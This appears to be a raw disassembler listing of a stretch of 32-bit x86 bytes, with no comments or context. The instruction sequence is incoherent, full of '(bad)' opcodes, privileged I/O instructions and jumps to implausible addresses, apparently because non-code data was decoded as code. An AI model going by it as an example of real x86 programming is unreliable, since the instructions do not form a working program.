  420b8d:	imul   DWORD PTR [esi+0x32d29063]
  420b93:	mov    ebp,0x6dc0a5b5
  420b98:	(bad)  
  420b99:	cmp    al,0x9a
  420b9b:	rol    BYTE PTR [edi],0xb1
  420b9e:	shr    DWORD PTR [edi-0x4ce68616],cl
  420ba4:	push   ss
  420ba5:	mov    bl,0x56
  420ba7:	mov    BYTE PTR [ebp-0x420b2231],cl
  420bad:	add    DWORD PTR [ebx],ecx
  420baf:	in     eax,dx
  420bb0:	mov    ah,0x33
  420bb2:	jns    0x420bce
  420bb4:	jg     0x420b6f
  420bb6:	dec    esp
  420bb7:	mov    bh,0xd2
  420bb9:	test   eax,edx
  420bbb:	mov    dh,0x49
  420bbd:	popa   
  420bbe:	jnp    0x420b4f
  420bc0:	in     al,dx
  420bc1:	sahf   
  420bc2:	push   ecx
  420bc3:	test   DWORD PTR [esi-0xf127033],ebx
  420bc9:	pop    esi
  420bca:	scas   eax,DWORD PTR es:[edi]
  420bcb:	pop    edx
  420bcc:	or     edx,ebp
  420bce:	jmp    0x2ca8d981
  420bd3:	shl    BYTE PTR [ebx+0x76d493e8],0xa0
  420bda:	mov    eax,0xdda09284
  420bdf:	mov    ds:0xa539e0e4,eax
  420be4:	ds push edi
  420be6:	sub    edi,DWORD PTR [esi]
  420be8:	(bad)  
  420be9:	cmp    al,0x13
  420beb:	aaa    
  420bec:	jl     0x420bc1
  420bee:	scas   eax,DWORD PTR es:[edi]
  420bef:	xchg   ebx,eax
  420bf0:	or     bh,BYTE PTR ds:0xfa8ac16e
  420bf6:	cdq    
  420bf7:	aad    0x66
  420bf9:	aad    0xc3
  420bfb:	sti    
  420bfc:	int3   
  420bfd:	or     bl,ch
  420bff:	not    BYTE PTR [eax-0x49262f5d]
  420c05:	aaa    
  420c06:	sub    edi,DWORD PTR [eax-0x29b0f221]
  420c0c:	idiv   BYTE PTR [ecx]
  420c0e:	mov    ebx,DWORD PTR [eax-0x1e]
  420c11:	retf   0xbe9b
  420c14:	sti    
  420c15:	ins    BYTE PTR es:[edi],dx
  420c16:	push   eax
  420c17:	fisttp DWORD PTR [esi]
  420c19:	mov    cl,0x52
  420c1b:	xor    DWORD PTR [ecx-0x1],ecx
  420c1e:	repnz lock sbb esi,DWORD PTR [esi-0x4b]
  420c23:	push   esi
  420c24:	or     al,cl
  420c26:	jmp    0x5984ec44
  420c2b:	xchg   esi,eax
  420c2c:	xor    eax,0x5be65e99
  420c31:	add    DWORD PTR [ebp+0x6d],edi
  420c34:	add    ecx,edi
  420c36:	jl     0x420c73
  420c38:	in     eax,0xce
  420c3a:	fs and al,0x3f
  420c3d:	pop    ss
  420c3e:	jecxz  0x420c89
  420c40:	sbb    DWORD PTR [esi],0xc0134066
  420c46:	repz adc eax,0x3d8708c4
  420c4c:	mov    ecx,DWORD PTR [edx]
  420c4e:	xor    BYTE PTR [ecx-0x3fce035d],ah
  420c54:	ret    0x64cb
  420c57:	(bad)  
  420c58:	push   0xffffffb1
  420c5a:	xor    ebx,DWORD PTR [esi+esi*1+0xe]
  420c5e:	mov    gs,WORD PTR [eax-0x14]
  420c61:	or     DWORD PTR [eax+0x3c],edi
  420c64:	or     eax,0xced54aa6
  420c69:	mov    bl,0x33
  420c6b:	mov    al,0xd5
  420c6d:	pop    edi
  420c6e:	add    bh,bl
  420c70:	mov    eax,ds:0x5159adb0
  420c75:	das    
  420c76:	loop   0x420c43
  420c78:	frstor [ebx]
  420c7a:	dec    edx
  420c7b:	aam    0xc9
  420c7d:	sbb    dh,bh
  420c7f:	hlt    
  420c80:	(bad)  
  420c81:	jb     0x420c2b
  420c83:	sub    BYTE PTR [ecx+0x35],cl
  420c86:	add    eax,0x8b38bfbd
  420c8b:	out    0x36,al
  420c8d:	ret    
  420c8e:	ror    BYTE PTR [edi+0x17],cl
  420c91:	mov    dh,0x9d
  420c93:	aam    0xd8
  420c95:	mov    dl,0x68
  420c97:	adc    edx,DWORD PTR [ebx-0x6329460f]
  420c9d:	cmp    eax,esi
  420c9f:	mov    edi,ebp
  420ca1:	mov    ah,0xda
  420ca3:	mov    cl,0x81
  420ca5:	fsubrp st(3),st
  420ca7:	inc    edx
  420ca8:	inc    esp
  420ca9:	fnstenv [eax-0x2973e698]
  420caf:	lahf   
  420cb0:	jp     0x420d31
  420cb2:	addr16 or ebx,edx
  420cb5:	mov    ds:0xdd9cb4aa,eax
  420cba:	and    DWORD PTR ds:0x2ae78119,0xc99b8d25
  420cc4:	mov    edx,0x9f3ecf0d
  420cc9:	fcom   DWORD PTR [ecx+0x5a344d62]
  420ccf:	imul   ebp,DWORD PTR ds:[edi+ebp*2+0xd08def7],0xfffffff5
  420cd8:	pop    edi
  420cd9:	shl    DWORD PTR [esi+0x1b],cl
  420cdc:	test   eax,0x3d95121e
  420ce1:	test   al,0x74
  420ce3:	call   0x7693bbf7
  420ce8:	stc    
  420ce9:	pop    eax
  420cea:	in     al,0x9d
  420cec:	inc    esp
  420ced:	cld    
  420cee:	adc    al,0x2
  420cf0:	add    DWORD PTR [edi+0x5acbaf70],edx
  420cf6:	xchg   ecx,eax
  420cf7:	adc    DWORD PTR [edx+0x1ad968e6],0x21
  420cfe:	repnz pop ss
  420d00:	and    al,0x59
  420d02:	xor    al,0x78
  420d04:	mov    WORD PTR [esi+0x73140b3d],ds
  420d0a:	and    eax,0x7ae354d9
  420d0f:	popf   
  420d10:	xchg   esp,eax
  420d11:	or     BYTE PTR [esi],0x34
  420d14:	inc    edx
  420d15:	sahf   
  420d16:	xlat   BYTE PTR ds:[ebx]
  420d17:	or     eax,0x5abc5e79
  420d1c:	dec    ecx
  420d1d:	jns    0x420d62
  420d1f:	outs   dx,DWORD PTR ds:[esi]
  420d20:	inc    ecx
  420d21:	sbb    BYTE PTR [edi],ah
  420d23:	clc    
  420d24:	cmp    ecx,DWORD PTR [edi+0x6e]
  420d27:	xchg   ecx,eax
  420d28:	mov    eax,0xf8b4d02f
  420d2d:	ds inc ebp
  420d2f:	(bad)  
  420d30:	xchg   edi,eax
  420d31:	sub    eax,0xe671c0c0
  420d36:	and    ebx,esi
  420d38:	and    BYTE PTR [edi+0x717e2ff2],bh
  420d3e:	push   dx
  420d40:	sbb    eax,0xd91a522e
  420d45:	shl    BYTE PTR [ebx],cl
  420d47:	(bad)  
  420d48:	adc    DWORD PTR [ecx+0x6d],esp
  420d4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d4c:	icebp  
  420d4d:	inc    eax
  420d4e:	pusha  
  420d4f:	rep lods eax,DWORD PTR ds:[esi]
  420d51:	push   ebx
  420d52:	shl    BYTE PTR [ebx+0xa],0x3e
  420d56:	sub    eax,0xc8c83965
  420d5c:	add    BYTE PTR [ebp-0x59],bh
  420d5f:	loop   0x420d79
  420d61:	pop    ebp
  420d62:	shr    BYTE PTR [edx-0x71],cl
  420d65:	or     DWORD PTR [edx],ebx
  420d67:	mov    bh,0x38
  420d69:	mov    eax,ds:0x5aa889ce
  420d6e:	in     eax,0xd3
  420d70:	(bad)  
  420d71:	fidiv  DWORD PTR [ebx+0x32]
  420d74:	enter  0x7567,0x63
  420d78:	sub    BYTE PTR [edi-0x8],ah
  420d7b:	xlat   BYTE PTR ds:[ebx]
  420d7c:	or     ebp,DWORD PTR [eax]
  420d7e:	pop    esp
  420d7f:	push   esp
  420d80:	dec    DWORD PTR [ebx+0x6237eaab]
  420d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d87:	push   eax
  420d88:	int    0x68
  420d8a:	xchg   esp,eax
  420d8b:	push   cs
  420d8c:	push   ss
  420d8d:	(bad)  
  420d8e:	push   ebx
  420d8f:	push   ss
  420d90:	ins    DWORD PTR es:[edi],dx
  420d91:	cli    
  420d92:	sti    
  420d93:	dec    edx
  420d94:	xchg   ebx,eax
  420d95:	ss std 
  420d97:	xchg   ch,bl
  420d99:	mov    dh,0x43
  420d9b:	test   DWORD PTR [edi+esi*2+0x51bdea24],ecx
  420da2:	mov    ebx,0x87bbf217
  420da7:	inc    edx
  420da8:	rcr    ebp,1
  420daa:	adc    dh,BYTE PTR [eax+esi*2]
  420dad:	in     eax,dx
  420dae:	mov    WORD PTR gs:[eax],cs
  420db1:	mov    ax,ds:0x816fb406
  420db7:	push   eax
  420db8:	sti    
  420db9:	inc    eax
  420dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dbb:	in     eax,dx
  420dbc:	pop    ds
  420dbd:	and    ah,bl
  420dbf:	dec    edx
  420dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dc1:	mov    eax,0x79fb3a84
  420dc6:	push   edx
  420dc7:	xor    BYTE PTR [eax+0x45582bdf],dl
  420dcd:	(bad)  
  420dce:	shl    BYTE PTR [ebp+ecx*8-0x2],0xa6
  420dd3:	lock push eax
  420dd5:	xlat   BYTE PTR ds:[ebx]
  420dd6:	test   DWORD PTR [edi-0xbf92f2d],ecx
  420ddc:	xchg   esp,eax
  420ddd:	in     al,dx
  420dde:	adc    BYTE PTR [eiz*1+0x802bc8d],ah
  420de5:	xchg   esi,eax
  420de6:	push   ebp
  420de7:	mov    cl,0x70
  420de9:	and    edi,DWORD PTR [eax]
  420deb:	loopne 0x420dd4
  420ded:	jmp    0x4b63:0x402198ad
  420df4:	sub    BYTE PTR [edx+eiz*2-0x4],0x8e
  420df9:	mov    ebx,0xe300e6bd
  420dfe:	into   
  420dff:	sub    BYTE PTR [ebx-0x44],bh
  420e02:	pop    ecx
  420e03:	stc    
  420e04:	dec    ebx
  420e05:	jmp    0x420e29
  420e07:	leave  
  420e08:	dec    ebp
  420e09:	jnp    0x420dbc
  420e0b:	lock stc 
  420e0d:	je     0x420d94
  420e0f:	push   cs
  420e10:	mov    dl,0x61
  420e12:	and    esi,DWORD PTR [edi+eax*4+0x781e86ac]
  420e19:	enter  0x646b,0xa2
  420e1d:	push   cs
  420e1e:	mov    edi,0xbb711596
  420e23:	(bad)  
  420e24:	mov    ?,esi
  420e26:	mov    al,0xc2
  420e28:	test   DWORD PTR [edi],esp
  420e2a:	cld    
  420e2b:	arpl   WORD PTR [edx-0x7e],bp
  420e2e:	jns    0x420e57
  420e30:	sub    ebp,DWORD PTR [eax+0x5]
  420e33:	fimul  DWORD PTR [esi-0xa]
  420e36:	loop   0x420e57
  420e38:	out    0xab,eax
  420e3a:	adc    al,bh
  420e3c:	sub    eax,0x4632b17e
  420e41:	mov    esp,0x894f2f38
  420e46:	cmp    al,0x6
  420e48:	ret    0x9e82
  420e4b:	scas   eax,DWORD PTR es:[edi]
  420e4c:	mov    cs,esp
  420e4e:	mov    cl,ch
  420e50:	adc    ebx,ebx
  420e52:	xchg   ecx,eax
  420e53:	ror    ebx,1
  420e55:	mov    ecx,0x80049825
  420e5a:	gs jne 0x420ed1
  420e5d:	out    dx,eax
  420e5e:	mov    cs,WORD PTR [ebp+0x5bb19686]
  420e64:	cmp    DWORD PTR [ebx+ebp*8],edx
  420e67:	pop    ds
  420e68:	dec    edx
  420e69:	jb     0x420e31
  420e6b:	mov    ah,0x10
  420e6d:	push   esi
  420e6e:	mov    esi,0xda3e7af0
  420e73:	push   cs
  420e74:	xor    esp,DWORD PTR [eax-0x39a75210]
  420e7a:	sbb    DWORD PTR [esp+edi*1+0xc1832a7],esp
  420e81:	sbb    dl,BYTE PTR [ebx-0x5d1b66cd]
  420e87:	fs out dx,al
  420e89:	adc    eax,0x9e8d13d0
  420e8e:	(bad)  [edx+ebx*4]
  420e91:	shl    DWORD PTR [eax],1
  420e93:	add    eax,0xdfe5a025
  420e98:	lds    esp,FWORD PTR [ebx]
  420e9a:	or     eax,0x3b5c63f6
  420e9f:	xchg   BYTE PTR [esi+0x42],bl
  420ea2:	dec    ecx
  420ea3:	rcl    esi,1
  420ea5:	rcl    BYTE PTR [ecx-0x6643103e],1
  420eab:	xchg   ecx,eax
  420eac:	stos   DWORD PTR es:[edi],eax
  420ead:	push   esp
  420eae:	(bad)  
  420eaf:	aam    0x2a
  420eb1:	and    al,0x8d
  420eb3:	addr16 into 
  420eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eb6:	mov    esi,0x8e628108
  420ebb:	xchg   ecx,eax
  420ebc:	rcl    edx,0xb4
  420ebf:	fsubr  QWORD PTR [esi]
  420ec1:	push   es
  420ec2:	ds jl  0x420f0c
  420ec5:	int    0xec
  420ec7:	daa    
  420ec8:	ret    
  420ec9:	pusha  
  420eca:	ins    DWORD PTR es:[edi],dx
  420ecb:	mov    eax,0xb00faa1d
  420ed0:	(bad)  
  420ed1:	out    0x96,al
  420ed3:	adc    cl,dl
  420ed5:	jne    0x420f41
  420ed7:	add    eax,0x1d3ef19a
  420edc:	cmp    al,0xf8
  420ede:	imul   edx,DWORD PTR [esi-0x1a],0x63208b64
  420ee5:	ds popw ds
  420ee8:	cmp    ebx,DWORD PTR [ecx]
  420eea:	pop    ebx
  420eeb:	mov    bh,0x59
  420eed:	sub    DWORD PTR [edx],edx
  420eef:	stos   BYTE PTR es:[edi],al
  420ef0:	fstp   QWORD PTR [esi]
  420ef2:	mov    ?,WORD PTR cs:0x8dd3c56
  420ef9:	jecxz  0x420f33
  420efb:	imul   ecx,DWORD PTR [eax-0x51b1f467],0x1f
  420f02:	add    edi,DWORD PTR [ebx]
  420f04:	add    DWORD PTR [ebp+0x32ab9969],eax
  420f0a:	xchg   edx,eax
  420f0b:	push   edx
  420f0c:	pop    ecx
  420f0d:	cmp    eax,0x90c4d21a
  420f12:	iret   
  420f13:	adc    bh,BYTE PTR [ebp+ecx*2+0x29bb5ee6]
  420f1a:	shl    DWORD PTR [edi],0x42
  420f1d:	int    0x1c
  420f1f:	push   ds
  420f20:	push   eax
  420f21:	xchg   esp,eax
  420f22:	mov    eax,ds:0xe062986a
  420f27:	xlat   BYTE PTR ds:[ebx]
  420f28:	push   es
  420f29:	mov    ebx,0x47bf2c8d
  420f2e:	scas   al,BYTE PTR es:[edi]
  420f2f:	into   
  420f30:	fmul   st,st(1)
  420f32:	mov    eax,0x8bb14efc
  420f37:	(bad)  
  420f38:	mov    al,0x76
  420f3a:	pop    esi
  420f3b:	out    dx,al
  420f3c:	dec    eax
  420f3d:	cmp    DWORD PTR [ecx+0x6289f643],0xfffffffa
  420f44:	stos   DWORD PTR es:[edi],eax
  420f45:	add    al,0xff
  420f47:	mov    ds:0xb354405,al
  420f4c:	neg    DWORD PTR [eax]
  420f4e:	mov    ds:0xf0759bde,al
  420f53:	xor    al,0xea
  420f55:	pop    ss
  420f56:	out    dx,al
  420f57:	dec    esp
  420f58:	ret    0x598c
  420f5b:	xchg   BYTE PTR [esi-0x4f],dl
  420f5e:	pop    ds
  420f5f:	pop    edi
  420f60:	test   esp,esi
  420f62:	mov    ds:0x17ec8485,al
  420f67:	int3   
  420f68:	div    BYTE PTR [edx-0xecfd8ce]
  420f6e:	pop    ss
  420f6f:	test   BYTE PTR [esi],0x4a
  420f72:	sbb    ecx,DWORD PTR [edx]
  420f74:	mul    BYTE PTR [ebp+0xff41ad0]
  420f7a:	xchg   BYTE PTR [ecx-0x3a04bc44],cl
  420f80:	lea    ebp,[ebp-0x78]
  420f83:	outs   dx,BYTE PTR ds:[esi]
  420f84:	xchg   BYTE PTR [edi+0x64],al
  420f87:	or     eax,DWORD PTR [ecx]
  420f89:	inc    esp
  420f8a:	dec    ecx
  420f8b:	fcom   QWORD PTR [edx+eax*8-0x7fb3bbb6]
  420f92:	mov    cs,WORD PTR [edx+0x66]
  420f95:	in     eax,dx
  420f96:	xchg   edx,eax
  420f97:	adc    al,ah
  420f99:	and    eax,0x3cefee5d
  420f9e:	scas   eax,DWORD PTR es:[edi]
  420f9f:	cmp    DWORD PTR [ebp-0x62ac34ee],0xc0b2d5e1
  420fa9:	mov    dh,dl
  420fab:	popf   
  420fac:	je     0x420f3d
  420fae:	sub    eax,0x8fc7c498
  420fb3:	(bad)  
  420fb4:	mov    ebp,0xb0255217
  420fb9:	rcr    BYTE PTR [ecx],cl
  420fbb:	jbe    0x420fb3
  420fbd:	jae    0x420fec
  420fbf:	add    eax,0x58226837
  420fc4:	push   cs
  420fc5:	mov    dh,dl
  420fc7:	pop    ds
  420fc8:	das    
  420fc9:	sub    al,0x8c
  420fcb:	push   ebx
  420fcc:	inc    edx
  420fcd:	sti    
  420fce:	mov    edi,0xfd6a8fba
  420fd3:	aam    0x77
  420fd5:	pop    edx
  420fd6:	cmp    BYTE PTR [ebp+0x41dbf5ad],0xff
  420fdd:	mov    BYTE PTR [ebx-0x5f],ah
  420fe0:	in     eax,0xa8
  420fe2:	lods   al,BYTE PTR ds:[esi]
  420fe3:	imul   DWORD PTR [ebp+0x28cd64c4]
  420fe9:	or     DWORD PTR [eax+0x5da66582],0x2a
  420ff0:	out    0x4,eax
  420ff2:	aad    0xc4
  420ff4:	inc    edi
  420ff5:	xor    ch,BYTE PTR [ecx-0x6b38e440]
  420ffb:	outs   dx,BYTE PTR ds:[esi]
  420ffc:	add    BYTE PTR [edx],0xa1
  420fff:	mov    dl,0xf3
  421001:	int    0x77
  421003:	mov    al,ds:0x1def0f96
  421008:	mov    edx,0xb50ed45
  42100d:	mov    dh,0xb9
  42100f:	cmp    DWORD PTR [ecx+0x435b310c],esi
  421015:	mov    ah,0xe0
  421017:	jg     0x421084
  421019:	ins    BYTE PTR es:[edi],dx
  42101a:	sbb    al,0x54
  42101c:	xsha1  (bad)
  42101d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42101e:	retf   0x216a
  421021:	pop    esi
  421022:	(bad)  
  421023:	jno    0x421083
  421025:	sbb    DWORD PTR [ecx],edx
  421027:	mov    ds:0x3e437e7d,al
  42102c:	nop
  42102d:	addr16 jl 0x4210af
  421030:	jae    0x42109b
  421032:	add    cl,ch
  421034:	mov    dl,bh
  421036:	punpckhwd mm4,mm1
  421039:	push   ecx
  42103a:	ret    0x874d
  42103d:	enter  0x58e1,0x2f
  421041:	in     eax,0xa5
  421043:	mov    esp,0x1982e94d
  421048:	loop   0x4210c8
  42104a:	and    eax,edx
  42104c:	aas    
  42104d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42104e:	hlt    
  42104f:	lahf   
  421050:	call   0x7b57ed70
  421055:	jle    0x421041
  421057:	shr    BYTE PTR [edx-0x70],0xdc
  42105b:	adc    edx,esp
  42105d:	jge    0x4210db
  42105f:	into   
  421060:	add    edx,ebp
  421062:	mov    DWORD PTR [eax+0x2486756b],ecx
  421068:	sar    DWORD PTR [ebx-0x4e],0xb2
  42106c:	test   BYTE PTR [esp+eiz*4],ah
  42106f:	mov    esi,0x9331c5
  421074:	xlat   BYTE PTR ds:[ebx]
  421075:	add    bl,BYTE PTR [ebx+0x69]
  421078:	lahf   
  421079:	ret    
  42107a:	adc    dl,BYTE PTR [esi]
  42107c:	std    
  42107d:	cmc    
  42107e:	xchg   BYTE PTR [edx+0x68],dh
  421081:	cmp    dh,ah
  421083:	arpl   WORD PTR ds:0xa3280b5,dx
  421089:	jge    0x42109b
  42108b:	pop    eax
  42108c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42108d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42108e:	ss xchg ecx,eax
  421090:	xor    al,0x2e
  421092:	add    DWORD PTR [eax-0x2329d026],edi
  421098:	mov    edx,0xa3103f90
  42109d:	mov    ebx,0x5a506a2b
  4210a2:	dec    esp
  4210a3:	mul    DWORD PTR [edi]
  4210a5:	packuswb mm4,QWORD PTR [ecx+0x53802f05]
  4210ac:	xlat   BYTE PTR ds:[ebx]
  4210ad:	inc    esp
  4210ae:	popa   
  4210af:	das    
  4210b0:	jno    0x4210bc
  4210b2:	mov    cl,0x92
  4210b4:	cdq    
  4210b5:	(bad)  
  4210b6:	cmp    al,0xad
  4210b8:	test   eax,0xff5f01b
  4210bd:	sti    
  4210be:	push   esp
  4210bf:	dec    eax
  4210c0:	test   eax,0xf84fa5cc
  4210c5:	push   cs
  4210c6:	mov    edi,0xf27ab18b
  4210cb:	scas   eax,DWORD PTR es:[edi]
  4210cc:	cdq    
  4210cd:	sbb    DWORD PTR [edx-0x50],esi
  4210d0:	std    
  4210d1:	and    eax,DWORD PTR [edx]
  4210d3:	inc    edx
  4210d4:	jle    0x421146
  4210d6:	shl    DWORD PTR [ecx],0x5
  4210d9:	or     DWORD PTR [edi],0xe6104035
  4210df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210e0:	mov    al,ds:0xde09364d
  4210e5:	int3   
  4210e6:	cmp    dh,cl
  4210e8:	xchg   ebp,eax
  4210e9:	add    DWORD PTR [esi-0x6c6d3ebb],0x3f0a8838
  4210f3:	addr16 push edx
  4210f5:	jge    0x8b36ad4d
  4210fb:	lds    ebp,FWORD PTR [edi-0x60]
  4210fe:	push   es
  4210ff:	arpl   di,ax
  421101:	mov    DWORD PTR [eax],eax
  421103:	mov    edx,0x4fbd4078
  421108:	stos   DWORD PTR es:[edi],eax
  421109:	add    BYTE PTR [esi+0x1],bh
  42110c:	push   ss
  42110d:	cmp    ah,BYTE PTR [ebp+eiz*4-0x5e]
  421111:	fistp  WORD PTR gs:[ecx+esi*1]
  421115:	add    al,0xdd
  421117:	sti    
  421118:	test   al,0x33
  42111a:	mov    ch,0xa3
  42111c:	or     eax,0x46643450
  421121:	adc    al,BYTE PTR [ecx]
  421123:	(bad)  
  421124:	(bad)  
  421125:	pushf  
  421126:	in     al,dx
  421127:	into   
  421128:	cmp    dl,ch
  42112a:	gs jne 0x421170
  42112d:	sbb    bh,bh
  42112f:	popf   
  421130:	fwait
  421131:	outs   dx,DWORD PTR ds:[esi]
  421132:	bound  edi,QWORD PTR [ecx-0x4f]
  421135:	add    ch,BYTE PTR [eax+0x1279a7e7]
  42113b:	stos   DWORD PTR es:[edi],eax
  42113c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42113d:	repnz adc DWORD PTR [ecx+edx*2],esi
  421141:	or     eax,0x34d997e1
  421146:	sbb    BYTE PTR [ecx],ah
  421148:	xor    eax,0xcd8d5692
  42114d:	pusha  
  42114e:	add    ecx,DWORD PTR [edi+esi*4]
  421151:	(bad)  
  421152:	pop    edi
  421153:	cmc    
  421154:	cmp    eax,0x44d6e640
  421159:	gs (bad) 
  42115b:	fidivr WORD PTR [eax-0x102ce636]
  421161:	jecxz  0x421120
  421163:	mov    bh,0x37
  421165:	mov    ds:0x383f8fa9,al
  42116a:	iret   
  42116b:	nop
  42116c:	fs inc esp
  42116e:	idiv   BYTE PTR [ebp+0x25046af2]
  421174:	in     al,dx
  421175:	xor    eax,0xdec4c729
  42117a:	int    0x43
  42117c:	ret    
  42117d:	stc    
  42117e:	rol    BYTE PTR [ecx],1
  421180:	inc    ecx
  421181:	fldenv [eax-0x7e0733a6]
  421187:	push   esp
  421188:	and    al,BYTE PTR [esi]
  42118a:	repz push 0xffffffc4
  42118d:	mov    ch,0xf9
  42118f:	sub    ebp,DWORD PTR [ecx-0x23]
  421192:	or     BYTE PTR [eax+eiz*8+0x7bda8e6d],bl
  421199:	enter  0x6275,0x72
  42119d:	pop    edx
  42119e:	shl    al,1
  4211a0:	jb     0x4211ef
  4211a2:	dec    ecx
  4211a3:	lods   al,BYTE PTR ds:[esi]
  4211a4:	inc    edi
  4211a5:	test   BYTE PTR [ecx+0x51],ch
  4211a8:	mov    bl,BYTE PTR [ebx+0x18]
  4211ab:	pop    eax
  4211ac:	imul   edi,DWORD PTR [esi+eax*2+0x774b5d09],0xffffffb0
  4211b4:	mov    ch,0x63
  4211b6:	adc    DWORD PTR [edi],ebx
  4211b8:	and    ebp,DWORD PTR [ebx]
  4211ba:	cld    
  4211bb:	sub    BYTE PTR [eax+0x43],ah
  4211be:	pop    esp
  4211bf:	sbb    BYTE PTR [ebx+0x6fdffee],bl
  4211c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211c6:	mov    eax,ds:0xd9c90b25
  4211cb:	dec    edx
  4211cc:	sbb    BYTE PTR [eax-0x1f],0x3d
  4211d0:	(bad)  
  4211d1:	jecxz  0x421229
  4211d3:	sub    edi,DWORD PTR [esi]
  4211d5:	leave  
  4211d6:	jmp    0xdfdcf1
  4211db:	fcomi  st,st(1)
  4211dd:	test   BYTE PTR [edx+edx*1],0x2e
  4211e1:	retf   
  4211e2:	emms   
  4211e4:	dec    esp
  4211e5:	cwde   
  4211e6:	(bad)  
  4211e7:	(bad)  
  4211e8:	cmp    bl,BYTE PTR [edx+0x41]
  4211eb:	and    edi,DWORD PTR [esp+ecx*2+0x29]
  4211ef:	add    dl,dl
  4211f1:	gs inc ecx
  4211f3:	mov    ebx,0x6571ce9a
  4211f8:	aad    0x39
  4211fa:	cmc    
  4211fb:	sbb    edi,DWORD PTR [esi+0xf]
  4211fe:	push   ecx
  4211ff:	or     ebx,DWORD PTR [ebx-0x69]
  421202:	lock test DWORD PTR [ecx+0x20],edx
  421206:	fld    QWORD PTR [edi-0x64]
  421209:	bound  ecx,QWORD PTR [edi+0x428e5e1a]
  42120f:	and    DWORD PTR [edx-0x5b40fec2],0x3102c63b
  421219:	rdpmc  
  42121b:	mov    ebx,0x542f3abf
  421220:	les    edi,FWORD PTR [ecx+0x32]
  421223:	out    dx,al
  421224:	jbe    0x4211de
  421226:	(bad)  
  421227:	in     eax,0xad
  421229:	aas    
  42122a:	adc    eax,0xa5be380d
  42122f:	sahf   
  421230:	jns    0x421267
  421232:	inc    eax
  421233:	or     BYTE PTR [eax+0x1],dh
  421236:	sbb    al,0xf6
  421238:	push   esi
  421239:	and    DWORD PTR [eax],ebp
  42123b:	sbb    BYTE PTR [esp+eax*1],dh
  42123e:	push   ecx
  42123f:	cmp    eax,0x68ff605a
  421244:	leave  
  421245:	adc    eax,0x4ca44abf
  42124a:	dec    ebp
  42124b:	push   es
  42124c:	push   ds
  42124d:	sub    BYTE PTR ds:0x802b25e0,cl
  421253:	sbb    edx,eax
  421255:	pop    ebx
  421256:	jae    0x42120a
  421258:	push   ebx
  421259:	js     0x421295
  42125b:	mov    bh,0x6d
  42125d:	push   esp
  42125e:	push   0xcf24e6ba
  421263:	cmp    BYTE PTR [eax+0x9],al
  421266:	cmp    ch,cl
  421268:	sbb    eax,0x1a3a59ec
  42126d:	or     ebp,DWORD PTR [ebp+0xe391db8]
  421273:	push   es
  421274:	xor    bl,ch
  421276:	arpl   WORD PTR [edx],di
  421278:	dec    esp
  421279:	adc    al,0xbf
  42127b:	sub    eax,ebp
  42127d:	sbb    DWORD PTR [esi+0x439edfee],edi
  421283:	sar    esi,cl
  421285:	repnz or ecx,DWORD PTR [ebx]
  421288:	xchg   BYTE PTR [ebx],cl
  42128a:	pop    ecx
  42128b:	sar    BYTE PTR [ebx-0x3dc1d021],0xb9
  421292:	mov    esp,0xe3b95b78
  421297:	test   DWORD PTR [esi+0x67],edi
  42129a:	or     esp,edi
  42129c:	rcr    ebx,1
  42129e:	ret    
  42129f:	xchg   edx,eax
  4212a0:	dec    esp
  4212a1:	pop    ebp
  4212a2:	fstp   TBYTE PTR [eax-0x43fc1718]
  4212a8:	sar    BYTE PTR [esi-0x49],0xbe
  4212ac:	xchg   edi,eax
  4212ad:	hlt    
  4212ae:	pop    es
  4212af:	mov    gs,WORD PTR [ecx-0x2b3d3db6]
  4212b5:	call   0xe9ab:0xd941a721
  4212bc:	inc    edi
  4212bd:	adc    ebp,DWORD PTR [eax]
  4212bf:	ja     0x4212b6
  4212c1:	call   0xa515:0x846872b8
  4212c8:	pop    es
  4212c9:	shl    DWORD PTR [esi+0x58],1
  4212cc:	inc    esp
  4212cd:	bound  esi,QWORD PTR [ecx]
  4212cf:	mov    dh,0x37
  4212d1:	jp     0x421294
  4212d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212d4:	jp     0x42132d
  4212d6:	mov    DWORD PTR [edi-0x29dd53ba],eax
  4212dc:	push   ebp
  4212dd:	inc    ebx
  4212de:	leave  
  4212df:	dec    edi
  4212e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212e1:	jge    0x42127d
  4212e3:	scas   al,BYTE PTR es:[edi]
  4212e4:	fwait
  4212e5:	xlat   BYTE PTR ds:[ebx]
  4212e6:	inc    esp
  4212e7:	fbstp  TBYTE PTR [ecx]
  4212e9:	mov    bl,0x5e
  4212eb:	je     0x421276
  4212ed:	or     ch,0x4a
  4212f0:	enter  0x126f,0x22
  4212f4:	mov    dh,0x43
  4212f6:	xchg   ebp,eax
  4212f7:	dec    ebp
  4212f8:	jp     0x4212cb
  4212fa:	jp     0x4212d5
  4212fc:	or     al,0x2d
  4212fe:	sbb    al,bl
  421300:	push   cs
  421301:	jae    0x4212ce
  421303:	lea    edx,[ecx+eax*8]
  421306:	iret   
  421307:	xchg   ebp,eax
  421308:	jge    0x421331
  42130a:	std    
  42130b:	ror    cl,1
  42130d:	fadd   QWORD PTR [ebp+ebx*1+0x2]
  421311:	sbb    edx,DWORD PTR [eax*2-0x758aa128]
  421318:	and    ecx,esp
  42131a:	ins    DWORD PTR es:[edi],dx
  42131b:	cmp    DWORD PTR [bp+0x1a56],ebx
  421320:	pop    ebp
  421321:	loopne 0x421380
  421323:	sbb    eax,ebp
  421325:	sbb    edi,DWORD PTR [edx-0x22e3c722]
  42132b:	cdq    
  42132c:	add    cl,cl
  42132e:	xchg   edx,eax
  42132f:	xchg   BYTE PTR [ecx-0x49936ba8],ah
  421335:	sub    BYTE PTR ds:0x25479669,ah
  42133b:	dec    esi
  42133c:	aas    
  42133d:	jae    0x421300
  42133f:	adc    dh,BYTE PTR [esi-0x42]
  421342:	ja     0x4212e5
